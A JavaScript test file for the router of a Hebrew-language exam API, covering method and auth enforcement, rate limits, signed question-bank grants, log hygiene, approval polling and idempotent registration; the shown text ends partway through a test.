// Run: node tests/api_reliability.test.cjs
//
// The router: what a request is allowed to do before a handler ever sees it.
// doGet/doPost used to be a 300-line switch plus three hand-kept lists of which
// action needs which token — this suite pins the registry that replaced them
// (method, auth rule, rate-limit identity, unknown actions) and the diagnostics
// the exam mornings are read from (the timing log must never echo a caller's
// string, health must touch nothing).
const test = require('node:test');
const assert = require('node:assert/strict');
const { createEnv } = require('./helpers/server_env.cjs');

const PENDING_HEADER = Array(19).fill('h');
const SESSION = 'ROUTER01';
const GATEWAY_URL = 'https://gw.example.workers.dev';
// startExam/startPractice refuse to write anything when the Worker that serves
// the question texts is not configured, so every environment here is a
// configured one unless a test is specifically about the unconfigured case.
const GATEWAY_PROPS = { GATEWAY_KEY: 'secret-key', GATEWAY_URL };
const NOW = Date.parse('2026-09-22T06:30:00Z');
const SESSIONS_HEADER = ['קוד', 'בוחן ת.ז.', 'שם בוחן', 'אתר', 'כיתה', 'דרגה', 'שפה', 'מצב שמע', 'זמן יצירה',
  'תקף עד', 'פעיל', 'כמויות JSON', 'מאושרים JSON', 'בוחן אחראי', 'אוכלוסיה'];
// A live session: column K (10) TRUE, column J (9) still in the future. Since
// r32 registerExaminee refuses to write into anything else (TODO 1.5), so every
// environment that registers needs this row.
function sessionRow(overrides) {
  const row = [SESSION, '111111111', 'בוחן א', 'בדיקת נתונים', '1', 'B', 'he', 'off',
    '2026-09-22T05:00:00Z', '2026-09-23T05:00:00Z', true, '', '', '', ''];
  return Object.assign(row, overrides || {});
}
function pendingRow(id, overrides) {
  const row = Array(19).fill('');
  row[0] = SESSION; row[1] = id; row[4] = '2026-09-22T06:00:00Z'; row[5] = 'approved';
  row[6] = 'he'; row[8] = 'B'; row[12] = 'token-' + id;
  return Object.assign(row, overrides || {});
}
function runtime(options) {
  const opts = options || {};
  const pending = (opts.ids || []).map(id => pendingRow(id));
  return createEnv({
    sheets: Object.assign({
      'ממתינים': [PENDING_HEADER, ...pending],
      'סשנים': [SESSIONS_HEADER, sessionRow()],
      'מבחנים': [Array(6).fill('h')],
      'בוחנים': [Array(11).fill('h')],
      'מורים': [Array(10).fill('h')]
    }, opts.sheets || {}),
    properties: opts.properties || Object.assign({}, GATEWAY_PROPS),
    sources: ['deployment/answer_key.gs']
  });
}
const idOf = n => String(900000000 + n);
const startExam = (e, n) => e.json(e.ctx.doPost({ postData: { contents: JSON.stringify({
  action: 'startExam', origin: 'examinee-app', sessionCode: SESSION, idNumber: idOf(n),
  examineeToken: 'token-' + idOf(n), language: 'he', license: 'B' }) } }));
const get = (e, params) => e.json(e.ctx.doGet({ parameter: Object.assign({ origin: 'examinee-app' }, params) }));

test('a whole class can start without sharing one candidate allowance', () => {
  const ids = Array.from({ length: 40 }, (_, i) => idOf(i + 1));
  const e = runtime({ ids });
  for (let i = 1; i <= 40; i++) {
    const reply = startExam(e, i);
    assert.equal(reply.status, 'ok', 'candidate ' + i);
    assert.equal(reply.questions.length, 30);
  }
  assert.equal(e.rows('מבחנים').length, 41, 'one registration each');
});

test('repeated starts by the same candidate remain rate limited', () => {
  const e = runtime({ ids: [idOf(1), idOf(2)] });
  for (let i = 0; i < 10; i++) assert.equal(startExam(e, 1).status, 'ok');
  const limited = startExam(e, 1);
  assert.equal(limited.rateLimited, true);
  assert.ok(limited.waitSec > 0 && limited.waitSec <= 60);
  assert.equal(startExam(e, 2).status, 'ok', 'another candidate is unaffected');
});

test('the rate-limit identity separates candidates and normalizes the same ID', () => {
  const e = runtime();
  const identity = e.ctx.apiRegistry().startExam.rateLimit.id;
  assert.notEqual(identity({ sessionCode: SESSION, idNumber: '1' }), identity({ sessionCode: SESSION, idNumber: '2' }));
  assert.equal(identity({ sessionCode: SESSION, idNumber: '1' }), identity({ sessionCode: SESSION, idNumber: '000000001' }));
  assert.notEqual(identity({ sessionCode: 'OTHER', idNumber: '1' }), identity({ sessionCode: SESSION, idNumber: '1' }));
});

// ---- practice allowances: four identities, one shared bucket ---------------
// student.html asks for the class code as OPTIONAL, so a soldier practising at
// home sends a studentId and no classCode. Until this release that fell through
// to the guest bucket, whose identifier is the constant 'anon' — five practice
// draws a minute for every such soldier in the country TOGETHER. Home practice
// is now its own identity; what is left in the guest bucket is a caller that
// names nothing at all, which our own pages never are.
const practice = (e, params) => get(e, Object.assign({ action: 'startPractice', license: 'B' }, params || {}));

test('guest practice allowance is unchanged: five a minute, one shared bucket', () => {
  const e = runtime();
  for (let i = 0; i < 5; i++) assert.equal(practice(e).status, 'ok');
  assert.equal(practice(e).rateLimited, true);
  // Two guests are indeed one bucket — that is the point of the identity, and
  // the reason a page must never be a guest.
  assert.equal(practice(e, { origin: 'student-app' }).rateLimited, true);
  // ...and a home practiser is not touched by what the guests spent.
  assert.equal(practice(e, { studentId: 'S-home' }).status, 'ok');
});

test('home practice is per device: one studentId cannot spend the draws of another', () => {
  const e = runtime();
  const first = practice(e, { studentId: 'S-aaa' });
  assert.equal(first.status, 'ok');
  // The grant names the identity the draw was rated against, so a Worker log can
  // be traced back to it: home practice is its own subject, not 'guest'.
  const payload = JSON.parse(Buffer.from(first.bank.grant.split('.')[0], 'base64url').toString('utf8'));
  assert.equal(payload.sub, 'home:S-aaa');
  for (let i = 1; i < 20; i++) assert.equal(practice(e, { studentId: 'S-aaa' }).status, 'ok', 'draw ' + (i + 1));
  const limited = practice(e, { studentId: 'S-aaa' });
  assert.equal(limited.rateLimited, true, 'the 21st draw of one device inside a minute');
  assert.ok(limited.waitSec > 0 && limited.waitSec <= 60);
  for (let i = 0; i < 20; i++) assert.equal(practice(e, { studentId: 'S-bbb' }).status, 'ok', 'other device, draw ' + (i + 1));
  assert.equal(practice(e, { studentId: 'S-bbb' }).rateLimited, true, 'and it has its own twenty, no more');
  assert.equal(practice(e, { studentId: 'S-aaa' }).rateLimited, true, 'the first device is still blocked, not reset');
});

test('one 300/min ceiling covers every caller without a class code — class students are outside it', () => {
  const e = runtime();
  let ok = 0;
  // Fifteen home devices × 20 draws each = 300, the whole minute's ceiling.
  for (let d = 0; d < 15; d++) {
    for (let i = 0; i < 20; i++) if (practice(e, { studentId: 'S-flood-' + d }).status === 'ok') ok++;
  }
  assert.equal(ok, 300, 'every device stayed inside its own allowance');
  assert.equal(practice(e, { studentId: 'S-fresh' }).rateLimited, true, 'a device that never practised is refused too');
  assert.equal(practice(e, { standaloneIdNumber: '900000001' }).rateLimited, true, 'standalone counts in the same ceiling');
  assert.equal(practice(e).rateLimited, true, 'so does a guest');
  assert.equal(practice(e, { classCode: 'CLS1', studentId: 'S-aaa' }).status, 'ok',
    'a class student is never locked out by a flood of anonymous practice');
});

test('a method the action does not accept is refused before the handler', () => {
  const e = runtime();
  let called = 0;
  e.ctx.handleLogin = () => { called++; return e.ctx.jsonResponse({ status: 'ok' }); };
  assert.match(get(e, { action: 'login' }).message, /דורשת POST/);
  assert.match(get(e, { action: 'submitResult' }).message, /דורשת POST/);
  assert.match(e.json(e.ctx.doPost({ postData: { contents: '{"action":"checkApproval","origin":"examinee-app"}' } })).message, /דורשת GET/);
  assert.equal(called, 0);
});

test('every auth rule is enforced by the router', () => {
  const e = runtime({ properties: { GATEWAY_KEY: 'secret-key' } });
  let reached = 0;
  e.ctx.handleExaminerDashboard = () => { reached++; return e.ctx.jsonResponse({ status: 'ok' }); };
  e.ctx.handleTeacherDashboard = () => { reached++; return e.ctx.jsonResponse({ status: 'ok' }); };
  assert.equal(get(e, { action: 'examinerDashboard', examinerId: '1', token: 'nope' }).tokenExpired, true);
  assert.equal(get(e, { action: 'teacherDashboard', teacherId: '1', token: 'nope' }).tokenExpired, true);
  assert.equal(get(e, { action: 'startExam' }).message, 'פעולה זו דורשת POST');
  assert.equal(reached, 0, 'no handler ran');

  e.ctx.defineAction('routerGatewayProbe', { methods: ['GET'], auth: 'gateway', handler: () => e.ctx.jsonResponse({ status: 'ok', gateway: true }) });
  assert.equal(get(e, { action: 'routerGatewayProbe' }).code, 'gateway_denied');
  assert.equal(get(e, { action: 'routerGatewayProbe', gatewayKey: 'wrong' }).code, 'gateway_denied');
  assert.equal(get(e, { action: 'routerGatewayProbe', gatewayKey: 'secret-key' }).gateway, true);
});

test('an unset gateway key denies every gateway request', () => {
  const e = runtime({ properties: {} });
  e.ctx.defineAction('routerGatewayProbe2', { methods: ['GET'], auth: 'gateway', handler: () => e.ctx.jsonResponse({ status: 'ok' }) });
  assert.equal(get(e, { action: 'routerGatewayProbe2', gatewayKey: '' }).code, 'gateway_denied');
});

// ---- the bank grant (DESIGN §11.2) -----------------------------------------
// The question texts stopped being public: without a signed grant a device can
// never load a question, so a server that cannot issue one must say so BEFORE
// it spends the examinee's attempt.
test('startExam refuses, and writes nothing, when the question Worker is not configured', () => {
  for (const properties of [{}, { GATEWAY_KEY: 'secret-key' }, { GATEWAY_URL }]) {
    const e = runtime({ ids: [idOf(1)], properties });
    e.resetCounters();
    const reply = startExam(e, 1);
    const counters = e.counters();
    const named = JSON.stringify(Object.keys(properties));
    assert.equal(reply.status, 'error', named);
    assert.equal(reply.code, 'bank_not_configured', named);
    assert.equal(reply.message, 'מאגר השאלות אינו מוגדר בשרת — פנה למנהל המערכת');
    assert.equal(counters.perSheet['מבחנים'].appends, 0, 'no registration written ' + named);
    assert.equal(counters.perSheet['ממתינים'].setValues, 0, 'the row was not flipped to in_exam ' + named);
    assert.equal(e.rows('ממתינים')[1][5], 'approved', 'the attempt is still available ' + named);
    // startPractice refuses on the same rule, for the same reason.
    assert.equal(get(e, { action: 'startPractice', license: 'B' }).code, 'bank_not_configured', named);
  }
});

test('a configured server hands startExam a four-hour grant for the Worker', () => {
  const e = runtime({ ids: [idOf(1)] });
  const reply = startExam(e, 1);
  assert.equal(reply.status, 'ok');
  assert.equal(reply.bank.url, GATEWAY_URL);
  assert.match(reply.bank.grant, /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/, 'payload.signature, base64url, no padding');
  assert.equal(reply.bank.exp, NOW + 4 * 3600 * 1000);
  const payload = JSON.parse(Buffer.from(reply.bank.grant.split('.')[0], 'base64url').toString('utf8'));
  assert.deepEqual(payload.ids, reply.questions.map(q => q.id), 'the granted ids are the drawn ids, in order');
  assert.equal(payload.s, 'exam');
  assert.equal(payload.sub, SESSION + ':' + idOf(1));
  assert.equal(payload.exp, reply.bank.exp);
  // A retry is idempotent in its ids and fresh in its signature.
  const again = startExam(e, 1);
  assert.deepEqual(again.questions.map(q => q.id), reply.questions.map(q => q.id));
  assert.equal(again.bank.exp, reply.bank.exp);
});

test('bankGrant is examiner-only, rate limited per examiner, and never leaks the key', () => {
  const expiry = new Date(NOW + 86400000).toISOString();
  const e = runtime({ sheets: { 'בוחנים': [Array(11).fill('h'),
    ['בוחן', '123456789', 'pw', 'כן', '7', 'בוחן', 'tokE', expiry, 0, '', '']] } });
  assert.equal(get(e, { action: 'bankGrant', examinerId: '123456789' }).tokenExpired, true);
  assert.equal(get(e, { action: 'bankGrant', examinerId: '123456789', token: 'nope' }).tokenExpired, true);
  assert.equal(e.json(e.ctx.doPost({ postData: { contents: JSON.stringify({
    action: 'bankGrant', origin: 'examiner-app', examinerId: '123456789', token: 'tokE' }) } })).message, 'פעולה זו דורשת GET');

  const ok = get(e, { action: 'bankGrant', examinerId: '123456789', token: 'tokE' });
  assert.equal(ok.status, 'ok');
  assert.equal(ok.bank.exp, NOW + 8 * 3600 * 1000);
  const payload = JSON.parse(Buffer.from(ok.bank.grant.split('.')[0], 'base64url').toString('utf8'));
  assert.deepEqual(Object.keys(payload), ['v', 's', 'sub', 'exp'], 'an examiner grant carries no id list');
  assert.equal(payload.sub, 'ex:123456789');
  assert.ok(!JSON.stringify(ok).includes('secret-key'), 'the signing key never reaches the client');

  const spec = e.ctx.apiRegistry().bankGrant;
  assert.equal(spec.methods.join(','), 'GET');   // the registry array is born in the vm realm
  assert.equal(spec.auth, 'examiner');
  assert.equal(spec.rateLimit.max, 30);
  assert.equal(spec.rateLimit.id({ examinerId: '123456789' }), spec.rateLimit.id({ examinerId: '123-456-789' }));
  assert.notEqual(spec.rateLimit.id({ examinerId: '123456789' }), spec.rateLimit.id({ examinerId: '987654321' }));
  for (let i = 1; i < 30; i++) assert.equal(get(e, { action: 'bankGrant', examinerId: '123456789', token: 'tokE' }).status, 'ok', 'grant ' + i);
  assert.equal(get(e, { action: 'bankGrant', examinerId: '123456789', token: 'tokE' }).rateLimited, true);
});

test('an unknown action is refused instead of answering "running"', () => {
  const e = runtime();
  // The old default said {status:'ok', message:'External Exam API is running'}
  // for ANY unknown action, which made feature detection impossible and hid typos.
  assert.match(get(e, { action: 'noSuchAction' }).message, /Unknown action: noSuchAction/);
  assert.equal(get(e, { action: 'noSuchAction' }).status, 'error');
  assert.equal(get(e, {}).message, 'External Exam API is running', 'the bare probe still answers');
});

test('two packages cannot declare the same action differently', () => {
  // A module that declares an action the legacy table also declares, with a
  // different method or auth rule, is a merge accident between two packages —
  // it must be loud, not silently last-one-wins.
  const conflicting = runtime();
  conflicting.ctx.defineAction('checkApproval', { methods: ['POST'], auth: 'examiner', handler: () => null });
  assert.throws(() => conflicting.ctx.ensureLegacyActions(), /conflicting defineAction for checkApproval/);

  // The same declaration twice is how the migration ends — it must be harmless.
  const identical = runtime();
  identical.ctx.defineAction('checkApproval', { methods: ['GET'], auth: 'none', handler: identical.ctx.handleClientOutdated });
  assert.doesNotThrow(() => identical.ctx.ensureLegacyActions());
});

test('health&deep=1 times one cell of our own document and reports a failure instead of throwing', () => {
  const e = runtime();
  const ok = get(e, { action: 'health', deep: '1' });
  assert.equal(ok.status, 'ok');
  assert.equal(ok.build, '2026-09-27-r35');
  assert.equal(ok.deep, true);
  assert.equal(ok.indexIds, 1700);
  assert.ok(typeof ok.sheetMs === 'number' && ok.sheetMs >= 0);
  assert.equal(ok.sheetError, '');
  assert.ok(typeof ok.totalMs === 'number' && ok.totalMs >= ok.sheetMs);
  e.ctx.getSheet = () => { throw new Error('document unavailable'); };
  const bad = get(e, { action: 'health', deep: '1' });
  assert.equal(bad.status, 'ok');
  assert.equal(bad.sheetMs, -1);
  assert.match(bad.sheetError, /document unavailable/);
});

test('health identifies build without Sheets, Drive or private parameters', () => {
  const e = runtime();
  e.ctx.getSheet = () => { throw new Error('health must not access Sheets'); };
  const result = get(e, { action: 'health', token: 'DO_NOT_LOG_ME' });
  assert.equal(result.status, 'ok');
  assert.equal(result.build, '2026-09-27-r35');
  assert.equal(e.logs.length, 2);
  assert.ok(e.logs[0].includes('"phase":"start"'));
  assert.ok(e.logs[1].includes('"phase":"end"'));
  assert.ok(!e.logs.join('').includes('DO_NOT_LOG_ME'));
  assert.equal(e.json(e.ctx.doGet({ parameter: { action: 'health' } })).status, 'error', 'origin is still required');
});

test('the timing log does not echo arbitrary action names', () => {
  const e = runtime();
  get(e, { action: 'PRIVATE_VALUE_DO_NOT_LOG' });
  assert.ok(e.logs.every(line => !line.includes('PRIVATE_VALUE_DO_NOT_LOG')));
  assert.ok(e.logs.every(line => line.includes('"action":"unknown"')));
  e.logs.length = 0;
  get(e, { action: 'health' });
  assert.ok(e.logs.every(line => line.includes('"action":"health"')), 'a real action is named');
});

test('the router logs completion and preserves structured retryable failures', () => {
  const e = runtime();
  e.ctx.handleGetSessionInfo = () => { throw Object.assign(new Error('busy'), { retryable: true, waitSec: 3, code: 'practice_maintenance' }); };
  const result = get(e, { action: 'getSessionInfo' });
  assert.equal(result.retryable, true);
  assert.equal(result.code, 'practice_maintenance');
  assert.equal(result.waitSec, 3);
  assert.ok(e.logs.at(-1).includes('"phase":"end"'));
  const malformed = e.json(e.ctx.doPost({ postData: { contents: '{' } }));
  assert.equal(malformed.status, 'error');
  assert.ok(e.logs.at(-1).includes('"method":"POST"'));
  const noBody = e.json(e.ctx.doPost({}));
  assert.equal(noBody.message, 'No POST data received');
});

test('an unauthorized origin is rejected for every action', () => {
  const e = runtime();
  assert.equal(e.json(e.ctx.doGet({ parameter: { action: 'health', origin: 'evil-app' } })).code, 'origin_denied');
  assert.equal(e.json(e.ctx.doPost({ postData: { contents: '{"action":"startExam"}' } })).code, 'origin_required');
});

test('a handler that has gone missing answers an error instead of crashing', () => {
  const e = runtime();
  e.ctx.handleListActiveExaminers = null;   // a module removed while others still route to it
  const reply = get(e, { action: 'listActiveExaminers' });
  assert.equal(reply.status, 'error');
  assert.match(reply.message, /Action not available/);
});

// ---- checkApproval: the answer that ends an examinee's polling --------------
// The waiting screen polls until it is told something final. A LIVE row answers
// as it always did; when none is left, the NEWEST finished row decides, and
// only when it is the examiner's own decision about the registration
// (rejected / cancelled). Everything else stays 'לא נמצא רישום', which the page
// reads as "your saved state is dead, start over".
const ID = idOf(1);
const approvalRow = (id, status, over) => pendingRow(id, Object.assign({ 5: status }, over || {}));
const approvals = rows => runtime({ sheets: { 'ממתינים': [PENDING_HEADER, ...rows] } });
// The handler itself; the API action answers exactly the same (test below).
const checkApproval = (e, id, token) => e.json(e.ctx.handleCheckApproval({ origin: 'examinee-app', sessionCode: SESSION, idNumber: id,
  examineeToken: token === undefined ? 'token-' + id : token }));
const postJson = (e, body) => e.json(e.ctx.doPost({ postData: { contents: JSON.stringify(Object.assign({ origin: 'examinee-app' }, body)) } }));

// Retired 21/09 (the page polled only through the Worker), served again in r33
// (24/09, KNOWN_ISSUES #38): they ARE the Google fallback of a phone that
// cannot reach the Worker. An answer of client_outdated here would put
// "המערכת מתעדכנת, רענן את הדף" on exactly the phones that most need an answer.
test('r33: checkApproval / getExamStatus are served again, with the handlers\' own answers and rules', () => {
  const e = approvals([approvalRow(ID, 'waiting'), approvalRow(idOf(2), 'in_exam', { 11: '2026-09-22T06:10:00Z' })]);
  const viaApi = get(e, { action: 'checkApproval', sessionCode: SESSION, idNumber: ID, examineeToken: 'token-' + ID });
  assert.deepEqual(viaApi, { status: 'ok', approval: 'waiting', audioMode: 'off' });
  assert.deepEqual(viaApi, checkApproval(e, ID), 'the API answers what the handler answers');
  const status = get(e, { action: 'getExamStatus', sessionCode: SESSION, idNumber: idOf(2), examineeToken: 'token-' + idOf(2) });
  assert.deepEqual(status, { status: 'ok', examStatus: 'in_exam', extraMinutes: 0 });
  // The token rule is unchanged: a stale token is refused on both.
  assert.equal(get(e, { action: 'checkApproval', sessionCode: SESSION, idNumber: ID, examineeToken: 'stale' }).examineeTokenError, 'mismatch');
  assert.equal(get(e, { action: 'getExamStatus', sessionCode: SESSION, idNumber: idOf(2), examineeToken: 'stale' }).examineeTokenError, 'mismatch');
  // Still GET only, exactly as before the retirement.
  assert.match(postJson(e, { action: 'checkApproval', sessionCode: SESSION, idNumber: ID }).message, /דורשת GET/);
  assert.match(postJson(e, { action: 'getExamStatus', sessionCode: SESSION, idNumber: ID }).message, /דורשת GET/);
  for (const action of ['checkApproval', 'getExamStatus']) {
    assert.equal(e.ctx.apiRegistry()[action].auth, 'none', action + ': the handler enforces its own token rule');
  }
  // ...and the handlers' own flood limit: 60 a minute per examinee (three polls
  // above already counted: the API one, the direct one and the stale token).
  for (let i = 0; i < 57; i++) assert.equal(get(e, { action: 'checkApproval', sessionCode: SESSION, idNumber: ID }).status, 'ok', 'poll ' + i);
  const limited = get(e, { action: 'checkApproval', sessionCode: SESSION, idNumber: ID });
  assert.equal(limited.rateLimited, true, 'the 61st poll inside a minute');
});

// r33.1 (24/09/2026): the examinee page sends "finished on device" as a BEACON
// (sendBeacon = POST) and has since r30; the router served markFinished to GET
// only, so every ping was refused and the examiner never saw "סיים — מסנכרן
// תוצאה" — exactly the banner that keeps a slow result from being redone.
test('r33.1: markFinished is accepted as a POST beacon and marks the in-exam row', () => {
  const e = approvals([approvalRow(ID, 'in_exam', { 11: '2026-09-22T06:10:00Z' })]);
  const viaPost = postJson(e, { action: 'markFinished', sessionCode: SESSION, idNumber: ID, examineeToken: 'token-' + ID });
  assert.equal(viaPost.status, 'ok', 'the beacon is accepted: ' + JSON.stringify(viaPost));
  // (the legacy rows are registered by the first dispatch, so read the registry after it)
  assert.equal(e.ctx.apiRegistry().markFinished.methods.slice().sort().join(','), 'GET,POST');   // VM arrays: compare as text
  assert.ok(String(e.rows('ממתינים')[1][18] || '').length > 0, 'and the row carries the finished-on-device time');
  assert.equal(e.rows('ממתינים')[1][5], 'in_exam', 'without changing the status');
  // The token rule is the handler's own and still holds for the POST.
  const stale = approvals([approvalRow(ID, 'in_exam')]);
  assert.equal(postJson(stale, { action: 'markFinished', sessionCode: SESSION, idNumber: ID, examineeToken: 'stale' }).examineeTokenError, 'mismatch');
  assert.equal(String(stale.rows('ממתינים')[1][18] || ''), '', 'nothing written for a stale token');
  // GET keeps working for an older page.
  const viaGet = approvals([approvalRow(ID, 'in_exam')]);
  assert.equal(get(viaGet, { action: 'markFinished', sessionCode: SESSION, idNumber: ID, examineeToken: 'token-' + ID }).status, 'ok');
});

test('a live registration outranks every finished row above it', () => {
  const e = approvals([approvalRow(ID, 'rejected'), approvalRow(ID, 'cancelled'), approvalRow(ID, 'waiting')]);
  assert.deepEqual(checkApproval(e, ID), { status: 'ok', approval: 'waiting', audioMode: 'off' });
  const approved = approvals([approvalRow(ID, 'cancelled'), approvalRow(ID, 'approved', { 9: 'on', 10: '1.25' })]);
  assert.deepEqual(checkApproval(approved, ID), { status: 'ok', approval: 'approved', audioMode: 'on', examMinutes: 50 });
});

test('the examiner rejecting or resetting the last registration is answered as itself', () => {
  assert.deepEqual(checkApproval(approvals([approvalRow(ID, 'rejected')]), ID), { status: 'ok', approval: 'rejected' });
  assert.deepEqual(checkApproval(approvals([approvalRow(ID, 'cancelled')]), ID), { status: 'ok', approval: 'cancelled' });
});

test('the shared-ID incident: the NEWEST decision answers, never an older rejection', () => {
  // Two examinees on one id (family): the first was rejected at 17:47, the
  // second cancelled at 18:05. The third visitor, polling on stale
  // localStorage, must be told the registration was cancelled — the whole
  // reason 'rejected' used to be skipped outright.
  assert.deepEqual(checkApproval(approvals([approvalRow(ID, 'rejected'), approvalRow(ID, 'cancelled')]), ID),
    { status: 'ok', approval: 'cancelled' });
  // ...and the mirror image, so this is "newest", not "cancelled wins".
  assert.deepEqual(checkApproval(approvals([approvalRow(ID, 'cancelled'), approvalRow(ID, 'rejected')]), ID),
    { status: 'ok', approval: 'rejected' });
});

test('a finished exam, a pending disqualification and an unknown id stay "לא נמצא רישום"', () => {
  for (const status of ['completed', 'disqualified']) {
    const e = approvals([approvalRow(ID, 'rejected'), approvalRow(ID, status)]);
    assert.deepEqual(checkApproval(e, ID), { status: 'error', message: 'לא נמצא רישום' }, status);
  }
  assert.equal(checkApproval(approvals([]), ID).message, 'לא נמצא רישום');
  assert.equal(checkApproval(approvals([approvalRow('900000777', 'rejected')]), ID).message, 'לא נמצא רישום');
  // dq_confirmed is not terminal: the examinee must receive it.
  assert.equal(checkApproval(approvals([approvalRow(ID, 'dq_confirmed')]), ID).approval, 'dq_confirmed');
});

test('a stale token is refused on a decided registration exactly as on a live one', () => {
  assert.equal(checkApproval(approvals([approvalRow(ID, 'waiting')]), ID, 'stale').examineeTokenError, 'mismatch');
  assert.equal(checkApproval(approvals([approvalRow(ID, 'rejected')]), ID, 'stale').examineeTokenError, 'mismatch');
  // A legacy row that stored no token, and a client that echoes none, are both
  // still answered — the deploy-window rule, unchanged.
  assert.equal(checkApproval(approvals([approvalRow(ID, 'rejected', { 12: '' })]), ID, 'anything').approval, 'rejected');
  assert.equal(checkApproval(approvals([approvalRow(ID, 'cancelled')]), ID, '').approval, 'cancelled');
});

test('a decision is never served from a cached snapshot — the re-registration is read first', () => {
  const e = approvals([approvalRow(ID, 'rejected')]);
  assert.equal(checkApproval(e, ID).approval, 'rejected');   // this poll fills the r23 snapshot
  // The examinee registers again a second later. The snapshot still holds only
  // the rejected row, and answering from it would stop their polling on a
  // decision that is no longer the truth.
  e.sheet('ממתינים').rows.push(approvalRow(ID, 'waiting'));
  assert.deepEqual(checkApproval(e, ID), { status: 'ok', approval: 'waiting', audioMode: 'off' });
});

// ---- r31.2 (22/09/2026): registration is idempotent for the device that made it
// A registration that Google answered late looked failed on the phone; the
// retry got 'כבר רשום' and the page went on WITHOUT a token, so the examiner
// could approve but startExam refused forever ('טוקן נבחן לא תקין'). The page
// now sends a regKey it keeps across its retries, and the server hands the
// same row's token back to the same key — and only to it.
const registerAs = (e, id, extra) => get(e, Object.assign({ action: 'registerExaminee', sessionCode: SESSION,
  idNumber: id, fullName: 'ישראל ישראלי', phone: '0501234567', language: 'he', license: 'B' }, extra || {}));

test('r31.2: a retry with the same regKey gets the same row and the same token back', () => {
  const e = runtime({});
  const first = registerAs(e, '900000501', { regKey: 'deadbeef12345678' });
  assert.equal(first.status, 'ok');
  assert.ok(first.examineeToken, 'a token is issued');
  assert.equal(e.rows('ממתינים').length, 2, 'one row');
  const retry = registerAs(e, '900000501', { regKey: 'deadbeef12345678' });
  assert.equal(retry.status, 'ok', 'the retry is not "already registered"');
  assert.equal(retry.examineeToken, first.examineeToken, 'the SAME token, so startExam will accept it');
  assert.equal(retry.resumed, true);
  assert.equal(e.rows('ממתינים').length, 2, 'and no second row');
});

test('r31.2: another key, or no key (an older page), is still refused as already registered', () => {
  const e = runtime({});
  assert.equal(registerAs(e, '900000502', { regKey: 'deadbeef12345678' }).status, 'ok');
  const other = registerAs(e, '900000502', { regKey: 'cafebabe87654321' });
  assert.equal(other.status, 'error');
  assert.match(other.message, /כבר רשום/);
  assert.equal(other.examineeToken, undefined, 'a different device never learns the token');
  const legacy = registerAs(e, '900000502', {});
  assert.equal(legacy.status, 'error');
  assert.match(legacy.message, /כבר רשום/);
  assert.equal(e.rows('ממתינים').length, 2);
});

test('r31.2: a malformed regKey is ignored, and a cancelled row lets the same key register anew', () => {
  const e = runtime({});
  const bad = registerAs(e, '900000503', { regKey: 'no spaces allowed!' });
  assert.equal(bad.status, 'ok', 'the key is optional — a bad one is just absent');
  assert.equal(registerAs(e, '900000503', { regKey: 'no spaces allowed!' }).status, 'error', 'so the retry has nothing to resume with');
  // the examiner reset the examinee: the live row is gone, the next attempt is a new registration
  e.rows('ממתינים')[1][5] = 'cancelled';
  const again = registerAs(e, '900000503', { regKey: 'feedface00112233' });
  assert.equal(again.status, 'ok');
  assert.equal(again.resumed, undefined);
  assert.equal(e.rows('ממתינים').length, 3, 'a new row, because the old one is not live');
});

// ---- TODO 1.5 (r32, 22/09/2026): the session is checked BEFORE anything is
// written. registerExaminee was the last live action that never looked at
// 'סשנים': a stale page, or a code typed from yesterday's whiteboard, appended
// a ממתינים row to a session that had ended, and the examinee then waited for an
// examiner who was not there. Same three messages as getSessionInfo (the page
// shows them as they are) — and READ-ONLY: getSessionInfo also deactivates an
// expired session, a registration must not.
const sessionsOf = overrides => ({ 'סשנים': [SESSIONS_HEADER, sessionRow(overrides)] });

test('r32 (TODO 1.5): an unknown, a closed and an expired session are refused with no row written', () => {
  const cases = [
    ['קוד סשן לא תקין', { 'סשנים': [SESSIONS_HEADER] }],                     // no such code
    ['הסשן הסתיים', sessionsOf({ 10: false })],                              // column K not TRUE
    ['תוקף הסשן פג', sessionsOf({ 9: '2026-09-22T05:00:00Z' })]              // column J in the past
  ];
  for (const [message, sheets] of cases) {
    const e = runtime({ sheets });
    e.resetCounters();
    const reply = registerAs(e, '900000600', { regKey: 'facefeed00112233' });
    assert.equal(reply.status, 'error', message);
    assert.equal(reply.message, message);
    assert.equal(reply.examineeToken, undefined, message + ': no token');
    assert.equal(e.rows('ממתינים').length, 1, message + ': nothing was appended');
    assert.equal(e.counters().perSheet['ממתינים'].appends, 0, message);
    assert.equal(e.counters().perSheet['סשנים'].setValues, 0,
      message + ': the check is READ-ONLY — getSessionInfo deactivates, a registration does not');
  }
});

test('r32 (TODO 1.5): a live session still registers, and the check costs one סשנים read', () => {
  const e = runtime({});
  e.resetCounters();
  const ok = registerAs(e, '900000601', { regKey: 'facefeed44556677' });
  assert.equal(ok.status, 'ok');
  assert.ok(ok.examineeToken);
  assert.equal(e.rows('ממתינים').length, 2);
  // 'סשנים' is served from the per-execution memo (12_reads.js), so the check is
  // one read — never one per registration path.
  assert.equal(e.counters().perSheet['סשנים'].fullReads, 1);
});

// ---- r32 (DESIGN §14.2): claim before write -------------------------------
// The phone now gives up at 30 s and retries the SAME regKey, so the two
// executions genuinely OVERLAP — Google's delivery hop is what is slow, and the
// first execution may still be queued (KNOWN_ISSUES #35). The memo is written
// as 'pending' BEFORE the sheet is read, and a second execution that finds it
// waits for the token instead of appending a second row.
test('r32: two overlapping executions of one regKey produce one row and one token', () => {
  const e = runtime({});
  const id = '900000510', key = 'aaaabbbbccccdddd';
  const params = { origin: 'examinee-app', sessionCode: SESSION, idNumber: id, fullName: 'ישראל ישראלי',
    phone: '0501234567', language: 'he', license: 'B', regKey: key };
  // Execution 1 has claimed the key and is still inside Google, before its append.
  e.ctx.claimRegistration(SESSION, id, key);
  let slept = 0;
  const realSleep = e.ctx.Utilities.sleep;
  e.ctx.Utilities.sleep = ms => {
    realSleep(ms);
    if (++slept === 3) e.ctx.registerExamineeLocked(params, key);   // execution 1 finally appends
  };
  const second = registerAs(e, id, { regKey: key });
  e.ctx.Utilities.sleep = realSleep;
  assert.equal(slept, 3, 'the retry waited for the claim instead of racing it');
  assert.equal(second.status, 'ok');
  assert.equal(second.resumed, true, 'it resumed the row execution 1 wrote');
  assert.equal(e.rows('ממתינים').length, 2, 'ONE row for the two executions');
  assert.equal(second.examineeToken, e.rows('ממתינים')[1][12], "the row's own token");
});

test('r32: a claim nobody redeems expires into a normal registration', () => {
  const e = runtime({});
  const id = '900000511', key = 'bbbbccccddddeeee';
  e.ctx.claimRegistration(SESSION, id, key);    // execution 1 claimed and then died
  const reply = registerAs(e, id, { regKey: key });
  assert.equal(reply.status, 'ok');
